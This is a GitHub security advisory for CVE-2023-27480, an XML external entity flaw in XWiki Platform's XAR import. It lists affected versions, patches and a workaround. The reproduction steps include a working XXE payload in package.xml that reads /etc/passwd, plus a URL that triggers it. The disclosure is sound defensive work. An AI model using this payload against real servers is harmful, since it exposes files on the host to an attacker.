# [H] XWiki Platform vulnerable to data leak via Improper Restriction of XML External Entity Reference

## Summary
Severity: High
Advisory: GHSA-gx4f-976g-7g6v
CVE: CVE-2023-27480
CWE: CWE-611
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2023-03-08
Source: https://github.com/advisories/GHSA-gx4f-976g-7g6v
Type: github-advisory

## Affected
- Maven: `org.xwiki.platform:xwiki-platform-xar-model` — affected >=1.1-milestone-3 <13.10.11
- Maven: `org.xwiki.platform:xwiki-platform-xar-model` — affected >=14.0 <14.4.7
- Maven: `org.xwiki.platform:xwiki-platform-xar-model` — affected >=14.5 <14.10-rc-1

## Details
### Impact
Any user with edit rights on a document can trigger a XAR import on a forged XAR file, leading to the ability to display the content of any file on the XWiki server host.

Example to reproduce:
* Create a forget XAR file and inside it, have the following `package.xml` content:
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

  <package>
  <infos>
  <name>&xxe;</name>
  <description> &xxe; Helper pages for creating and listing Class/Template/Sheets</description>
  <licence></licence>
  <author>XWiki.Admin</author>
  ...
  ```
* Upload it onto a wiki page (e.g. `XXE`) as an attachment (e.g. `test.xar`).
* Call the page using `http://localhost:8080/xwiki/bin/view/Main/XXE?sheet=XWiki.AdminImportSheet&file=test.xar`

You'll then notice that the displayed UI contains the content of the `/etc/passwd` file.

### Patches
The vulnerability has been patched in XWiki 13.10.11, 14.4.7 and 14.10-rc-1.

### Workarounds
You'd need to get XWiki Platform sources and apply the changes from https://github.com/xwiki/xwiki-platform/commit/e3527b98fdd8dc8179c24dc55e662b2c55199434 to the `XarPackage` java class and then copy the modified version to your `WEB-INF/classes` directory (or rebuild the `xwiki-platform-xar-model` maven module and replace the one found in `WEB-INF/lib/`).

### References
* https://github.com/xwiki/xwiki-platform/commit/e3527b98fdd8dc8179c24dc55e662b2c55199434
* https://jira.xwiki.org/browse/XWIKI-20320

### For more information
If you have any questions or comments about this advisory:
*    Open an issue in [Jira XWiki.org](https://jira.xwiki.org/)
*    Email us at [Security Mailing List](mailto:security@xwiki.org)

## References
- https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-gx4f-976g-7g6v
- https://nvd.nist.gov/vuln/detail/CVE-2023-27480
- https://github.com/xwiki/xwiki-platform/commit/e3527b98fdd8dc8179c24dc55e662b2c55199434
- https://github.com/xwiki/xwiki-platform
- https://jira.xwiki.org/browse/XWIKI-20320
